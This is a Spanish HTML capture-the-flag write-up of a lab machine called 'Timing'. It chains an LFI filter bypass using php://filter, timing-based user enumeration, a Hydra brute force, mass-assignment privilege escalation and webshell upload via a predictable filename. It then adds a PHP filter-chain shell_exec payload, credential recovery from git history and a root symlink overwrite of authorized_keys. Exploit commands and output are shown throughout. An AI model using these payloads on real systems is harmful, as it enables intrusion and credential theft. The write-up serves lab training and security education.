+                <pre><code class="language-plaintext">http://10.129.2.206/login.php [200 OK] Apache[2.4.29], Bootstrap,
+Email[dkstudioin@gmail.com], PHP, jQuery, Title[Simple WebApp]</code></pre>
+
+                <p>Lo importante aquí es que la aplicación está hecha en PHP y corre sobre Apache — ambos serán
+                    relevantes más adelante.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>La web inicialmente solo muestra un formulario de login. Fuzzeando con gobuster se descubren las
+                    siguientes rutas:</p>
+
+                <pre><code class="language-plaintext">images          (Status: 301)
+css             (Status: 301)
+upload.php      (Status: 302) --> ./login.php
+<span style="color:#4ec9b0;">image.php</span>       (Status: 200) [Size: 0]
+profile.php     (Status: 302) --> ./login.php
+index.php       (Status: 302) --> ./login.php
+logout.php      (Status: 302) --> ./login.php
+js              (Status: 301)
+header.php      (Status: 302) --> ./login.php
+footer.php      (Status: 200) [Size: 3937]
+server-status   (Status: 403)
+db_conn.php     (Status: 200) [Size: 0]</code></pre>
+
+                <p>La mayoría de endpoints redirigen a <code>login.php</code>, pero <code>image.php</code> destaca —
+                    devuelve un <code>200</code> con cuerpo vacío, lo que sugiere que podría cargar contenido a partir
+                    de parámetros de la query. Al ser una app PHP, es probable que use <code>include()</code> o algo
+                    similar para servir los datos de la imagen.</p>
+
+                <p>Para confirmarlo, fuzzeo en busca de nombres de parámetros válidos usando una imagen que sé que
+                    existe en el servidor (<code>images/user-icon.png</code>) como valor de referencia, filtrando las
+                    respuestas vacías:</p>
+
+                <pre><code class="language-bash">wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "http://10.129.2.206/image.php?FUZZ=images/user-icon.png" --hh 0</code></pre>
+
+                <pre><code class="language-plaintext">000002803:   200        213 L    1501 W   36611 Ch   <span style="color:#4ec9b0;">"img"</span></code></pre>
+
+                <p>El parámetro <code>img</code> carga los datos de la imagen correctamente:</p>
+
+                <img src="./media/image4.png" alt="Respuesta de image.php mostrando datos de imagen cargados a través del parámetro img" />
+
+                <p>Lo importante es que, al pasar un archivo PHP como <code>login.php</code> como valor, la página
+                    renderiza su salida HTML en lugar de mostrar su código fuente — lo que significa que el servidor
+                    está haciendo un <code>include()</code>, no una simple lectura de archivo. Esto es una
+                    vulnerabilidad LFI clásica.</p>
+
+                <h2>LFI — Bypass del Filtro y Lectura de Archivos</h2>
+                <p>Intentar un path traversal estándar se bloquea de inmediato:</p>
+
+                <pre><code class="language-plaintext">http://10.129.1.80/image.php?img=../../../../../etc/hostname
+→ Hacking attempt detected!</code></pre>
+
+                <p>Hacer doble URL encoding de las barras (<code>%252F</code>) tampoco funciona — el servidor o bien
+                    las decodifica antes de la comprobación, o el filtro es suficientemente inteligente para
+                    detectarlo.</p>
+
+                <p>Sin embargo, usar <code>php://filter</code> con una ruta absoluta esquiva el filtro por completo,
+                    ya que no hay secuencias <code>../</code> de por medio:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/etc/hostname"</code></pre>
+
+                <pre><code class="language-plaintext">dGltaW5nCg==</code></pre>
+
+                <pre><code class="language-bash">echo "dGltaW5nCg==" | base64 -d
+# timing</code></pre>
+
+                <p>También existe un truco con nombres de filtro inexistentes — PHP ignora silenciosamente los filtros
+                    desconocidos y aun así resuelve el resource, por lo que el contenido se devuelve sin codificar y en
+                    texto plano (aunque no siempre funciona según el tipo de contenido):</p>
+
+                <pre><code class="language-bash">http://10.129.1.80/image.php?img=php://filter/convert.base64-xd/resource=/etc/hostname
+# timing</code></pre>
+
+                <p>En <code>/etc/passwd</code> identifico un usuario llamado <code>aaron</code>. Leyendo la
+                    configuración del sitio por defecto de Apache confirmo la document root y las rutas de los logs:</p>
+
+                <pre><code class="language-bash">view-source:http://10.129.1.80/image.php?img=php://filter/convert.base64-xd/resource=/etc/apache2/sites-available/000-default.conf</code></pre>
+
+                <pre><code class="language-apache"><span style="color:#569cd6;">DocumentRoot</span> <span style="color:#ce9178;">/var/www/html</span>
+<span style="color:#569cd6;">ErrorLog</span>    <span style="color:#ce9178;">${APACHE_LOG_DIR}/error.log</span>
+<span style="color:#569cd6;">CustomLog</span>   <span style="color:#ce9178;">${APACHE_LOG_DIR}/access.log</span> combined</code></pre>
+
+                <p>Para archivos PHP, el truco del filtro inexistente no funciona de forma fiable ya que el código PHP
+                    se ejecuta en lugar de devolverse como texto. El filtro base64 es la solución correcta aquí —
+                    simplemente paso el resultado por <code>base64 -d</code> en local para leer el código fuente:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/db_conn.php" | base64 -d</code></pre>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#9cdcfe;">$pdo</span> = <span style="color:#dcdcaa;">new PDO</span>(<span style="color:#ce9178;">'mysql:host=localhost;dbname=app'</span>, <span style="color:#ce9178;">'root'</span>, <span style="color:#ce9178;">'4_V3Ry_l0000n9_p422w0rd'</span>);
+</code></pre>
+
+                <p>Credenciales de base de datos encontradas. Ahora leo <code>login.php</code> para entender la lógica
+                    de la aplicación:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/login.php" | base64 -d</code></pre>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">createTimeChannel</span>()
+{
+    <span style="color:#dcdcaa;">sleep</span>(<span style="color:#b5cea8;">1</span>);
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_GET</span>[<span style="color:#ce9178;">'login'</span>])) {
+    <span style="color:#9cdcfe;">$username</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'user'</span>];
+    <span style="color:#9cdcfe;">$password</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'password'</span>];
+
+    <span style="color:#9cdcfe;">$statement</span> = <span style="color:#9cdcfe;">$pdo</span>-&gt;<span style="color:#dcdcaa;">prepare</span>(<span style="color:#ce9178;">"SELECT * FROM users WHERE username = :username"</span>);
+    <span style="color:#9cdcfe;">$result</span>    = <span style="color:#9cdcfe;">$statement</span>-&gt;<span style="color:#dcdcaa;">execute</span>(<span style="color:#dcdcaa;">array</span>(<span style="color:#ce9178;">'username'</span> =&gt; <span style="color:#9cdcfe;">$username</span>));
+    <span style="color:#9cdcfe;">$user</span>      = <span style="color:#9cdcfe;">$statement</span>-&gt;<span style="color:#dcdcaa;">fetch</span>();
+
+    <span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$user</span> !== <span style="color:#569cd6;">false</span>) {
+        <span style="color:#dcdcaa;">createTimeChannel</span>();   <span style="color:#6a9955;">// delay de 1 segundo solo si el usuario existe</span>
+        <span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">password_verify</span>(<span style="color:#9cdcfe;">$password</span>, <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'password'</span>])) {
+            <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'userid'</span>] = <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'id'</span>];
+            <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'role'</span>]   = <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'role'</span>];
+            <span style="color:#dcdcaa;">header</span>(<span style="color:#ce9178;">'Location: ./index.php'</span>);
+            <span style="color:#c586c0;">return</span>;
+        }
+    }
+    <span style="color:#9cdcfe;">$errorMessage</span> = <span style="color:#ce9178;">"Invalid username or password entered"</span>;
+}
+</code></pre>
+
+                <p>La función <code>createTimeChannel()</code> introduce un delay de 1 segundo, pero solo cuando el
+                    nombre de usuario consultado existe en la base de datos. Si el usuario no existe, la respuesta es
+                    inmediata. Esto es un canal lateral de temporización clásico: los nombres de usuario válidos tardan
+                    ~1 segundo en responder, los inválidos responden instantáneamente.</p>
+
+                <p>Probando con nombres de usuario candidatos conocidos confirmo que tanto <code>admin</code> como
+                    <code>aaron</code> existen. Ejecuto Hydra contra ambos mientras también pruebo manualmente:</p>
+
+                <pre><code class="language-bash">hydra -L &lt;(echo -e "aaron\nadmin") \
+  -P /usr/share/wordlists/rockyou.txt \
+  10.129.1.80 http-post-form \
+  "/login.php?login=true:user=^USER^&password=^PASS^:F=Invalid" \
+  -t 64</code></pre>
+
+                <p>Las credenciales <code>aaron</code> / <code>aaron</code> funcionan. Al iniciar sesión se muestra
+                    la interfaz de la aplicación.</p>
+
+                <h2>Mass Assignment — Escalada a Administrador</h2>
+
+                <img src="./media/image1.png" alt="Página de login de la aplicación web PHP Simple WebApp" />
+
+                <p>Tras iniciar sesión hay una página de perfil donde el usuario puede actualizar sus datos:</p>
+
+                <img src="./media/image3.png" alt="Página de actualización de perfil mostrando campos editables para firstName, lastName, email y company" />
+
+                <p>La actualización del perfil la procesa <code>profile_update.php</code>. Leyendo su código fuente
+                    a través del LFI se descubre algo interesante — el campo <code>role</code> se procesa directamente
+                    desde los datos POST sin ninguna comprobación de autorización:</p>
+
+                <pre><code class="language-php"><span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'role'</span>])) {
+    <span style="color:#9cdcfe;">$role</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'role'</span>];
+    <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'role'</span>] = <span style="color:#9cdcfe;">$role</span>;
+}</code></pre>
+
+                <p>Mass assignment clásico — el servidor asigna ciegamente cualquier valor de <code>role</code>
+                    proporcionado por el usuario a la sesión. Interceptar la petición de actualización del perfil y
+                    añadir <code>&role=1</code> al cuerpo POST es todo lo que hace falta:</p>
+
+                <pre><code class="language-plaintext">firstName=test&lastName=test&email=test&company=test<span style="color:#4ec9b0;">&role=1</span></code></pre>
+
+                <p>La sesión queda establecida con role 1 (admin), lo que desbloquea un nuevo endpoint:
+                    <code>/avatar_uploader.php</code>.</p>
+
+                <h2>Subida de Archivos — Ingeniería Inversa del Nombre de Archivo</h2>
+                <p>El subidor de avatares llama a <code>upload.php</code>. Leyendo su código fuente via LFI:</p>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#dcdcaa;">include</span>(<span style="color:#ce9178;">"admin_auth_check.php"</span>);
+
+<span style="color:#9cdcfe;">$upload_dir</span> = <span style="color:#ce9178;">"images/uploads/"</span>;
+
+<span style="color:#c586c0;">if</span> (!<span style="color:#dcdcaa;">file_exists</span>(<span style="color:#9cdcfe;">$upload_dir</span>)) {
+    <span style="color:#dcdcaa;">mkdir</span>(<span style="color:#9cdcfe;">$upload_dir</span>, <span style="color:#b5cea8;">0777</span>, <span style="color:#569cd6;">true</span>);
+}
+
+<span style="color:#9cdcfe;">$file_hash</span> = <span style="color:#dcdcaa;">uniqid</span>();
+<span style="color:#9cdcfe;">$file_name</span> = <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">time</span>()) . <span style="color:#ce9178;">'_'</span> . <span style="color:#dcdcaa;">basename</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"name"</span>]);
+<span style="color:#9cdcfe;">$target_file</span> = <span style="color:#9cdcfe;">$upload_dir</span> . <span style="color:#9cdcfe;">$file_name</span>;
+
+<span style="color:#9cdcfe;">$imageFileType</span> = <span style="color:#dcdcaa;">strtolower</span>(<span style="color:#dcdcaa;">pathinfo</span>(<span style="color:#9cdcfe;">$target_file</span>, <span style="color:#569cd6;">PATHINFO_EXTENSION</span>));
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">"submit"</span>])) {
+    <span style="color:#9cdcfe;">$check</span> = <span style="color:#dcdcaa;">getimagesize</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"tmp_name"</span>]);
+    <span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$check</span> === <span style="color:#569cd6;">false</span>) {
+        <span style="color:#9cdcfe;">$error</span> = <span style="color:#ce9178;">"Invalid file"</span>;
+    }
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$imageFileType</span> != <span style="color:#ce9178;">"jpg"</span>) {
+    <span style="color:#9cdcfe;">$error</span> = <span style="color:#ce9178;">"This extension is not allowed."</span>;
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">empty</span>(<span style="color:#9cdcfe;">$error</span>)) {
+    <span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">move_uploaded_file</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"tmp_name"</span>], <span style="color:#9cdcfe;">$target_file</span>)) {
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"The file has been uploaded."</span>;
+    }
+}
+</code></pre>
+
+                <p>Dos cosas destacan. Primero, las subidas están restringidas a la extensión <code>.jpg</code>.
+                    Segundo — y esto es lo crítico — la generación del nombre de archivo tiene un bug:</p>
+
+                <pre><code class="language-php"><span style="color:#9cdcfe;">$file_hash</span> = <span style="color:#dcdcaa;">uniqid</span>();
+<span style="color:#9cdcfe;">$file_name</span> = <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">time</span>()) . ...</code></pre>
+
+                <p>Fijaos en que <code>'$file_hash'</code> está entre comillas simples — es un string literal, no
+                    una interpolación de variable. PHP no expande variables dentro de cadenas entre comillas simples,
+                    por lo que <code>$file_hash</code> es literalmente el string <code>$file_hash</code>, no el
+                    resultado de <code>uniqid()</code>. Esto significa que el hash es completamente determinista:
+                    <code>md5("$file_hash" . time())</code>, donde <code>time()</code> es el único factor desconocido
+                    — y ese se puede leer directamente de la cabecera <code>Date</code> de la respuesta HTTP.</p>
+
+                <p>La restricción a <code>.jpg</code> tampoco es un problema, porque el endpoint LFI hace un
+                    <code>include()</code> de cualquier ruta que se le pase — el código PHP incrustado en un archivo
+                    <code>.jpg</code> se ejecutará igualmente al ser incluido.</p>
+
+                <p>El plan: subir una webshell PHP con extensión <code>.jpg</code> y luego lanzarla a través del LFI.
+                    Para eso necesito predecir el nombre de archivo resultante.</p>
+
+                <p>Tras subir un archivo de prueba, la respuesta HTTP contiene la hora del servidor en la cabecera
+                    <code>Date</code>. La convierto a timestamp Unix usando el intérprete interactivo de PHP:</p>
+
+                <pre><code class="language-bash">php --interactive</code></pre>
+
+                <pre><code class="language-php">php &gt; <span style="color:#c586c0;">echo</span> <span style="color:#dcdcaa;">strtotime</span>(<span style="color:#ce9178;">"Wed, 18 Feb 2026 17:36:06 GMT"</span>);
+<span style="color:#b5cea8;">1771436166</span>
+
+php &gt; <span style="color:#c586c0;">echo</span> <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">strtotime</span>(<span style="color:#ce9178;">"Wed, 18 Feb 2026 17:36:06 GMT"</span>)) . <span style="color:#ce9178;">'_xd.jpg'</span>;
+<span style="color:#4ec9b0;">29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg</span></code></pre>
+
+                <p>Confirmo que la webshell se ejecuta a través del LFI:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?cmd=id&img=php://filter/convert.base64-xd/resource=/var/www/html/images/uploads/29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg"</code></pre>
+
+                <pre><code class="language-plaintext">uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <p>RCE confirmado. Al intentar reverse shells (tanto bash estándar como busybox netcat) no se establece
+                    ninguna conexión — el tráfico saliente parece estar bloqueado por firewall. Como no puedo recibir
+                    callbacks, uso un wrapper de comandos sencillo basado en curl:</p>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;">#!/bin/bash</span>
+<span style="color:#6a9955;"># command.sh — envía un comando a la webshell y muestra la salida</span>
+curl -G <span style="color:#ce9178;">"http://10.129.1.80/image.php"</span> \
+  --data-urlencode <span style="color:#ce9178;">"cmd=<span style="color:#9cdcfe;">$1</span>"</span> \
+  --data-urlencode <span style="color:#ce9178;">"img=php://filter/convert.base64-xd/resource=/var/www/html/images/uploads/29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg"</span></code></pre>
+
+                <p>Para un intérprete interactivo real sin conexiones salientes, una
+                    <a href="https://github.com/IppSec/forward-shell">forward shell como la de IppSec</a> sería la
+                    herramienta ideal — simula una sesión de shell completamente a través de peticiones HTTP
+                    entrantes.</p>
+
+                <h2>LFI mediante Cadenas de Filtros PHP (Camino No Intencionado)</h2>
+                <p>Cabe mencionar que esta máquina — publicada en diciembre de 2021 — también es vulnerable a un
+                    camino de explotación no intencionado: RCE mediante cadenas de filtros PHP. Esta técnica fue
+                    publicada por loknop el 30 de diciembre de 2021 en
+                    <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">este gist</a>, y
+                    posteriormente automatizada por Synacktiv en su herramienta
+                    <a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>.
+                </p>
+
+                <p>La técnica abusa de los wrappers <code>php://filter</code> de PHP para encadenar múltiples
+                    conversiones de codificación en secuencia, construyendo una cadena arbitraria de la nada —
+                    sintetizando efectivamente código PHP sin necesidad de escribir ningún archivo. Cuando la cadena
+                    resultante se pasa a una llamada <code>include()</code>, el código generado se ejecuta:</p>
+
+                <pre><code class="language-bash">python3 php_filter_chain_generator --chain <span style="color:#ce9178;">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span></code></pre>
+
+                <pre><code class="language-plaintext">[+] The following gadget chain will generate the following code :
+    &lt;?php echo shell_exec($_GET["cmd"]);?&gt;
+    (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
+
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF(...)
+</code></pre>
+
+                <img src="./media/image2.png" alt="Salida del generador de cadenas de filtros PHP mostrando la cadena generada que sintetiza una webshell PHP via LFI" />
+
+                <p>Esto daría RCE inmediato a través del LFI solo, sin necesidad de tocar la subida de archivos en
+                    absoluto. Sin embargo, al ser un camino no intencionado, el resto del writeup sigue la ruta
+                    oficial.</p>
+
+                <h2>Historial Git — Descubrimiento de Credenciales</h2>
+                <p>Navegando por el sistema de archivos con el wrapper de comandos encuentro un archivo interesante en
+                    <code>/opt</code>:</p>
+
+                <pre><code class="language-bash">./command.sh "ls -lah /opt"</code></pre>
+
+                <pre><code class="language-plaintext">total 624K
+drwxr-xr-x  2 root root 4.0K Dec  2 2021 .
+drwxr-xr-x 24 root root 4.0K Nov 29 2021 ..
+-rw-r--r--  1 root root 614K Jul 20 2021 <span style="color:#4ec9b0;">source-files-backup.zip</span></code></pre>
+
+                <p>Lo descargo a través del LFI (el truco de <code>php://filter</code> también funciona con archivos
+                    binarios):</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?cmd=id&img=php://filter/convert.base64-xd/resource=/opt/source-files-backup.zip" \
+  --output source-files.zip</code></pre>
+
+                <p>Al descomprimir el archivo aparece una carpeta <code>backup/</code> que contiene un directorio
+                    <code>.git</code>. Consulto el historial de commits:</p>
+
+                <pre><code class="language-bash">git log --oneline</code></pre>
+
+                <p>Hay dos commits — el inicial y otro más. Haciendo diff del commit no-inicial contra el primero se
+                    revela una contraseña cambiada en <code>db_conn.php</code>:</p>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#9cdcfe;">$pdo</span> = <span style="color:#dcdcaa;">new PDO</span>(<span style="color:#ce9178;">'mysql:host=localhost;dbname=app'</span>, <span style="color:#ce9178;">'root'</span>, <span style="color:#ce9178;">'S3cr3t_unGu3ss4bl3_p422w0Rd'</span>);
+</code></pre>
+
+                <p>El <code>db_conn.php</code> actual en el servidor en producción usa una contraseña diferente (más
+                    débil), pero esta antigua podría haberse reutilizado en otros sitios. La pruebo para SSH como
+                    <code>aaron</code>:</p>
+
+                <pre><code class="language-bash">ssh aaron@10.129.1.80</code></pre>
+
+                <p>Las credenciales <code>aaron:S3cr3t_unGu3ss4bl3_p422w0Rd</code> funcionan. Flag de usuario
+                    obtenida.</p>
+
+                <h2>Escalada de Privilegios — Escritura como Root via Symlink con netutils</h2>
+                <p>Compruebo los permisos sudo de <code>aaron</code>:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: <span style="color:#4ec9b0;">/usr/bin/netutils</span></code></pre>
+
+                <pre><code class="language-bash">file /usr/bin/netutils</code></pre>
+
+                <pre><code class="language-plaintext">/usr/bin/netutils: Bourne-Again shell script, ASCII text executable</code></pre>
+
+                <pre><code class="language-bash">cat /usr/bin/netutils</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;">#! /bin/bash</span>
+java -jar /root/netutils.jar</code></pre>
+
+                <p>El script ejecuta un JAR de Java que vive en <code>/root</code> — no se puede leer directamente.
+                    Lo ejecuto para ver qué hace:</p>
+
+                <pre><code class="language-plaintext">netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit</code></pre>
+
+                <p>Dos opciones de descarga. Pruebo primero la opción FTP — monto un servidor FTP rápido con
+                    <code>pyftpdlib</code>:</p>
+
+                <pre><code class="language-bash">python3 -m pyftpdlib</code></pre>
+
+                <pre><code class="language-plaintext">>>> starting FTP server on 0.0.0.0:2121, pid=15856 <<<
+10.129.1.80:38518-[anonymous] RETR /home/.../xd.jpg completed=1 bytes=30</code></pre>
+
+                <p>La opción FTP descarga el archivo, pero no ocurre nada más — no se crea ningún archivo de salida
+                    visible.</p>
+
+                <p>La opción HTTP se comporta de manera diferente. Al apuntarla a mi servidor HTTP, descarga el archivo
+                    y lo escribe en disco usando el nombre de archivo de la ruta de la URL:</p>
+
+                <pre><code class="language-plaintext">Input >> 1
+Enter Url: http://10.10.14.98
+Initializing download: http://10.10.14.98
+File size: 667 bytes
+Opening output file <span style="color:#4ec9b0;">default</span>
+Starting download
+Downloaded 667 byte in 0 seconds. (6.50 KB/s)</code></pre>
+
+                <pre><code class="language-bash">ls -la</code></pre>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 667 Feb 18 18:19 <span style="color:#4ec9b0;">default</span></code></pre>
+
+                <p>El archivo se escribe como <strong>root</strong>, en el directorio de trabajo actual, con el nombre
+                    de archivo derivado de la ruta de la URL. Si solicito <code>http://10.10.14.98/asd.txt</code>,
+                    escribe un archivo llamado <code>asd.txt</code>. Esto es escritura arbitraria de archivos como root
+                    — limitada al directorio actual, pero eso es suficiente.</p>
+
+                <p>El exploit es un ataque de symlink. Creo un enlace simbólico en el directorio home de Aaron con el
+                    nombre <code>authorized_keys</code> apuntando a <code>/root/.ssh/authorized_keys</code>. Cuando
+                    <code>netutils</code> escribe un archivo llamado <code>authorized_keys</code> en el directorio
+                    actual, sigue el symlink y escribe en el archivo real de claves autorizadas de root:</p>
+
+                <pre><code class="language-bash">ln -s /root/.ssh/authorized_keys ~/authorized_keys</code></pre>
+
+                <p>En mi máquina local preparo un archivo llamado <code>authorized_keys</code> con mi clave pública SSH
+                    y lo sirvo con un servidor HTTP de Python:</p>
+
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+                <p>Ahora lanzo la descarga a través de <code>netutils</code>:</p>
+
+                <pre><code class="language-plaintext">Input >> 1
+Enter Url: http://10.10.14.98:8000/authorized_keys
+Initializing download: http://10.10.14.98:8000/authorized_keys
+File size: 93 bytes
+Opening output file <span style="color:#4ec9b0;">authorized_keys</span>
+Starting download
+Downloaded 93 byte in 0 seconds. (0.90 KB/s)</code></pre>
+
+                <pre><code class="language-plaintext">10.129.1.80 - - "GET /authorized_keys HTTP/1.0" 200 -</code></pre>
+
+                <p>La descarga se completa y <code>netutils</code> escribe en <code>~/authorized_keys</code> — que se
+                    resuelve a través del symlink hacia <code>/root/.ssh/authorized_keys</code>. Mi clave pública queda
+                    ahora autorizada para el login de root:</p>
+
+                <pre><code class="language-bash">ssh -i id_rsa root@10.129.1.80</code></pre>
+
+                <p>Acceso root confirmado. Flag de root obtenida.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
